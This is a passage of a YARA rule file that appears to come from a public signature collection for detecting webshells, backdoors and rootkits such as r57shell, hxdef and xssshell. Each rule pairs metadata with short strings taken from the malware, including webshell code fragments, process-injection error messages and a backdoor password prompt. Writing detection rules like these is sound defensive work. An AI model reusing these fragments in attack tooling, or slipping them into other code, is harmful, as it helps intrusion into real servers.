		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f97386dfde148942b7584aeb6512b85"
		logic_hash = "59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgntboot
{
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8147-L8159"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		logic_hash = "10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell
{
	meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8160-L8172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		logic_hash = "a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8173-L8186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		logic_hash = "a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs100
{
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8187-L8199"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		logic_hash = "8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_Mithril
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8200-L8218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "017191562d72ab0ca551eb89256650bd"
		logic_hash = "5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_2
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8219-L8232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		logic_hash = "d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webadmin
{
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Florian Roth (Nextron Systems)"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8254-L8265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a90de401b30e5b590362ba2dde30937"
		logic_hash = "6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"

	condition:
		all of them
}

rule SIGNATURE_BASE_Commands
{
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8266-L8278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		logic_hash = "5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkdoordll
{
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8279-L8290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b715c009d47686c0e62d0981efce2552"
		logic_hash = "a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_2
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8291-L8302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgiis6Cli
{
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8317-L8329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		logic_hash = "f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Remview_2003_04_22
{
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8330-L8341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		logic_hash = "2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Cress
{
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8355-L8367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36a416186fe010574c9be68002a7286a"
		logic_hash = "670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell
{
	meta:
		description = "Webshells Auto-generated - file webshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8368-L8383"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
		logic_hash = "e3fdce426d2f6e88d8e9412a3026ea05d027af934763eafe0188602458c2289d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_EFSO_2
{
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e88d324c-1dee-5b07-b528-cf760e3ee7a6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8384-L8396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Index3
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8397-L8408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		logic_hash = "3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"

	condition:
		all of them
}

rule SIGNATURE_BASE_Adjustcr
{
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8409-L8423"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		logic_hash = "d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Apppack_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8436-L8447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell
{
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8448-L8459"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		logic_hash = "6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Usr
{
	meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8460-L8471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ade3357520325af50c9098dc8a21a024"
		logic_hash = "f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8472-L8483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Db
{
	meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8484-L8495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		logic_hash = "3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Sh
{
	meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8496-L8507"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		logic_hash = "da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Default
{
	meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8508-L8519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		logic_hash = "6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_2
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8520-L8533"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		logic_hash = "c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"

	condition:
		all of them
}

rule SIGNATURE_BASE_By064Cli
{
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8534-L8546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "10e0dff366968b770ae929505d2a9885"
		logic_hash = "51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"

	condition:
		all of them
}

rule SIGNATURE_BASE_Peek_A_Boo
{
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8560-L8576"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aca339f60d41fdcba83773be5d646776"
		logic_hash = "b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"

	condition:
		all of them
}

rule SIGNATURE_BASE_Fmlibraryv3
{
	meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8577-L8588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c34c248fed6d5a20d8203924a2088acc"
		logic_hash = "a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"

	condition:
		all of them
}

rule SIGNATURE_BASE_Connector
{
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
